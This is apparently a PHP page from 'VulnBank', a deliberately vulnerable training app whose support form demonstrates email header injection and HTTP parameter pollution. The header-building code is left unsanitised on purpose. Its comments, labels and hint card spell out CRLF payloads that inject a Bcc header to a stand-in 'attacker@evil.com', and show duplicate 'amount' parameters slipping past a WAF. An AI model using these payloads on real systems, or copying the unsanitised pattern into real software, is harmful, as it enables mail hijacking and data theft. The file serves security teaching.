<?php
// ============================================================
//  VulnBank – Contact / Support
//  CWE-93:  Email Header Injection via PHP mail()
//  CWE-235: HTTP Parameter Pollution demo
// ============================================================
require_once 'db.php';
require '_header.php';

$msg = $error = $hpp_result = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? 'contact';

    // ── Email Header Injection ────────────────────────────────
    if ($action === 'contact') {
        $name    = $_POST['name']    ?? '';
        $email   = $_POST['email']   ?? '';
        $subject = $_POST['subject'] ?? '';  // CWE-93: injection point
        $body    = $_POST['message'] ?? '';

        // CWE-93: EMAIL HEADER INJECTION
        // $subject is used in the mail() "additional_headers" arg.
        // Injecting \r\n allows adding arbitrary headers (Bcc, Cc, From).
        //
        // Payload in subject:
        //   Bank Statement%0D%0ABcc: attacker@evil.com
        //   → adds a Bcc header, CC'ing every support email to attacker
        //
        // Payload for body injection:
        //   Normal subject%0D%0A%0D%0AHello%2C this is injected body
        $to       = 'support@vulnbank.local';
        $headers  = "From: $name <$email>\r\n"; // also injectable via $name/$email
        $headers .= "Reply-To: $email\r\n";

        // Simulate mail() call (don't actually send in demo)
        $cmd_preview = "mail('$to', '$subject', '$body', '$headers')";
        // mail($to, $subject, $body, $headers); // commented out but shows the pattern

        $msg = "Support ticket submitted!<br>
                <small class='text-muted'>Simulated call: <code>" . htmlspecialchars($cmd_preview) . "</code></small>";

        // A09: Support tickets not logged
    }

    // ── HTTP Parameter Pollution ──────────────────────────────
    if ($action === 'hpp_demo') {
        // CWE-235: PHP uses the LAST value when duplicate params are sent
        // GET/POST: amount=100&amount=9999 → PHP sees amount=9999
        // A WAF or signature checker might only inspect the FIRST occurrence
        $amount = $_POST['amount'] ?? 'not set';
        $hpp_result = "PHP received amount = <strong>" . htmlspecialchars($amount) . "</strong><br>
                       <small class='text-muted'>If you sent amount=100&amp;amount=9999, PHP used the last value.</small>";
    }
}
?>

<div class="row">
  <div class="col-md-6">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">CWE-93 Email Header Injection</span>
      <span class="badge-vuln">CWE-235 HTTP Parameter Pollution</span>
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Contact Support</div>
      <div class="card-body">
        <?php if ($msg):   ?><div class="alert alert-success"><?= $msg ?></div><?php endif; ?>
        <?php if ($error): ?><div class="alert alert-danger"><?= $error ?></div><?php endif; ?>

        <form method="POST">
          <input type="hidden" name="action" value="contact">
          <div class="form-group mb-2">
            <label>Your Name</label>
            <input type="text" name="name" class="form-control"
                   value="<?= htmlspecialchars($_POST['name'] ?? '') ?>"
                   placeholder="Alice">
          </div>
          <div class="form-group mb-2">
            <label>Email
              <span class="vuln-label">[inject headers via \r\n]</span>
            </label>
            <input type="text" name="email" class="form-control"
                   value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
                   placeholder="alice@example.com">
          </div>
          <div class="form-group mb-2">
            <label>Subject
              <span class="vuln-label">[CWE-93: try "Help%0D%0ABcc: attacker@evil.com"]</span>
            </label>
            <input type="text" name="subject" class="form-control"
                   value="<?= htmlspecialchars($_POST['subject'] ?? '') ?>"
                   placeholder="Billing question&#10;Bcc: attacker@evil.com">
          </div>
          <div class="form-group mb-3">
            <label>Message</label>
            <textarea name="message" class="form-control" rows="4"></textarea>
          </div>
          <button class="btn btn-primary w-100">Send Message</button>
        </form>
      </div>
    </div>
  </div>

  <div class="col-md-6">
    <!-- HTTP Parameter Pollution -->
    <div class="card shadow mb-3">
      <div class="card-header">HTTP Parameter Pollution Demo <span class="vuln-label">[CWE-235]</span></div>
      <div class="card-body">
        <?php if ($hpp_result): ?><div class="alert alert-info"><?= $hpp_result ?></div><?php endif; ?>
        <form method="POST">
          <input type="hidden" name="action" value="hpp_demo">
          <p class="text-muted" style="font-size:.85rem">
            PHP uses the LAST duplicate parameter. A WAF may inspect only the FIRST.<br>
            Submit <code>amount=100&amp;amount=9999</code> → PHP sees 9999.
          </p>
          <div class="input-group mb-2">
            <span class="input-group-text">$</span>
            <input type="text" name="amount" class="form-control" value="100" placeholder="First amount">
          </div>
          <div class="input-group mb-3">
            <span class="input-group-text">$</span>
            <input type="text" name="amount" class="form-control" value="9999" placeholder="Duplicate amount (PHP uses this)">
          </div>
          <button class="btn btn-warning w-100">Test HPP</button>
        </form>
      </div>
    </div>

    <div class="card hint-card shadow-sm">
      <div class="card-body" style="font-size:.8rem">
        <strong>Email header injection payload:</strong><br>
        In Subject field: <code>Help me%0D%0ABcc:%20attacker@evil.com</code><br>
        Or in Name field: <code>Alice%0D%0AFrom:%20bank@legit.com</code><br><br>
        <strong>PHP mail() call becomes:</strong><br>
        <code>mail($to, "Help me\r\nBcc: attacker@evil.com", $body, $headers)</code><br>
        → All support emails secretly CC'd to attacker.<br><br>
        <strong>HPP in banking:</strong> WAF checks <code>amount=100</code>, PHP processes <code>amount=9999</code>.
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
